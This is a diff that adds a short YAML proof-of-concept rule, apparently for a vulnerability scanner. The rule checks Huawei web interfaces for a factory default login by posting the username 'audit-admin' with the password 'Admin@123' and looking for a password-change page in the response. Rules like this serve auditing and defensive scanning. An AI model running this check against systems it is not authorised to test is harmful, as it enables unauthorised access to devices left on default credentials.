@@ -1,0 +1,12 @@
+name: huawei-default-passwd
+rules:
+  - method: POST
+    path: "/default.html"
+    body: |
+      spring-security-redirect=&password=Admin%40123&language=zh_CN&username=audit-admin&platcontent=
+    expression: |
+      response.status==200 && response.body.bcontains(b'/modifyPwd.html')
+detail:
+  author: Hanfu
+  links: 
+    - https://github.com/Hanfu-l/POC-Exp
